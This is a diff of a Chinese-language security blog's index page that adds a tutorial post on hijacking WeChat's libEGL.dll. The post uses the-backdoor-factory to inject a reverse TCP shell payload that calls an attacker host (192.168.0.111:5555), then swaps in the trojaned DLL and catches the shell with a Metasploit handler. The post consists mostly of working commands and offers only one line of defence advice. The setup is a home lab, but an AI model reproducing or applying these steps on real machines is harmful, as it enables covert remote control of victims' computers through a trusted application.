@@ -155,6 +155,110 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/13/dll-hijack/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="沫">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="沫的博客">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/02/13/dll-hijack/" class="post-title-link" itemprop="url">DLL劫持微信反弹shell</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-02-13 17:17:00 / 修改时间：18:05:22" itemprop="dateCreated datePublished" datetime="2020-02-13T17:17:00+08:00">2020-02-13</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><p>受害者主机 windows10</p>
+<p>攻击者主机 kali ip地址：192.168.0.111</p>
+<p>攻击工具 超强任务管理器(Process Explorer) <span style="color:red">windows工具</span></p>
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>使用Process Explorer去寻找微信的dll加载文件，需要先打开微信，然后光标点击微信使用ctrl+f去进行搜索目标文件<span style="color:red">libeay32</span></p>
+<p><span style="color:blue">下面是执行操作图，然后双击文件就可以找到目标文件路径</span><br><img src="/images/pasted-59.png" alt="upload successful"></p>
+<p><span style="color:blue">打开目标文件夹会发现这2个dll文件，都是可以进行dll注入亲测</span></p>
+<p><img src="/images/pasted-60.png" alt="upload successful"><br><span style="color:blue">我的kali虚拟机无法进行粘贴复制所以只能使用scp命令进行上传</span></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp ./libEGL.dll root@192.168.0.111:/the-backdoor-factory-master</span><br></pre></td></tr></table></figure>
+<p><img src="/images/pasted-61.png" alt="upload successful"></p>
+<h3 id="开始生成木马文件"><a href="#开始生成木马文件" class="headerlink" title="开始生成木马文件"></a>开始生成木马文件</h3><p>打开kali进入到/the-backdoor-factory-master文件夹里执行./backdoor.py -f libEGL.dll 对文件进行可利用payload检测</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./backdoor.py -f libEGL.dll</span><br></pre></td></tr></table></figure>
+<p><span style="color:blue">下图是我可以利用的payload其中包含了 reverse_shell_tcp_inline 我们可以利用这个payload进行shell反弹</span><br><img src="/images/pasted-62.png" alt="upload successful"><br>生成木马文件,-f参数是指我们需要把那个文件进行生成， -s 参数是我们需要加入的payload文件名 -P 是端口 -H是主机地址，因为我们反弹到kali所以填写kali的主机地址就行了 注意大小写</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./backdoor.py -f libEGL.dll -s reverse_shell_tcp_inline -P 5555 -H 192.168.0.111</span><br></pre></td></tr></table></figure>
+<p><span style="color:blue">他是选择让我们用一个身份证进行会话，我这里只有一个所以选择1</span><br><img src="/images/pasted-63.png" alt="upload successful"><br><span style="color:blue">生成成功后他会创建一个backdoored文件夹这里面是存放的我们生成好的木马</span></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@mo:/the-backdoor-factory-master<span class="comment"># cd backdoored/</span></span><br><span class="line">root@mo:/the-backdoor-factory-master/backdoored<span class="comment"># ls</span></span><br><span class="line">libEGL.dll</span><br></pre></td></tr></table></figure>
+<p><span style="color:blue">存放已经生成好的木马</span><br><img src="/images/pasted-64.png" alt="upload successful"><br>接下来只需要把木马拿回到windows，并且替换掉那个文件夹的原文件</p>
+<p><span style="color:blue">因为我没办法复制粘贴所以只能scp进行传输，把这个文件替换win这边就算配置好了</span><br><img src="/images/pasted-65.png" alt="upload successful"></p>
+<h3 id="msf获取shell反弹"><a href="#msf获取shell反弹" class="headerlink" title="msf获取shell反弹"></a>msf获取shell反弹</h3><p>加载插件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br></pre></td></tr></table></figure>
+<p><img src="/images/pasted-66.png" alt="upload successful"><br>选择我们刚刚写入的payload</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> payload windows/shell_reverse_tcp</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/pasted-67.png" alt="upload successful"><br>配置ip地址</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> lhost 192.168.0.111</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/pasted-68.png" alt="upload successful"><br>配置监听端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> lport 5555</span><br></pre></td></tr></table></figure>
+<p><img src="/images/pasted-69.png" alt="upload successful"><br>检查总体配置</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure>
+<p><img src="/images/pasted-75.png" alt="upload successful"><br>开始监听</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run</span><br></pre></td></tr></table></figure>
+<p>这个时候已经在监听，只需要打开微信就可以获取到shell，不需要登录<br><img src="/images/pasted-76.png" alt="upload successful"></p>
+<p>获取到的shell<br><img src="/images/pasted-77.png" alt="upload successful"></p>
+<h3 id="攻击防护"><a href="#攻击防护" class="headerlink" title="攻击防护"></a>攻击防护</h3><p>不要去任何不信任或没授权的应用商店去下载软件。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/12/redis-unauthorized/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -873,20 +977,20 @@ sign参数和token参数，from参数和to参数可以选择固定也可以选�
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">26</span>
+          <span class="site-state-item-count">27</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-count">10</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">27</span>
+        <span class="site-state-item-count">29</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
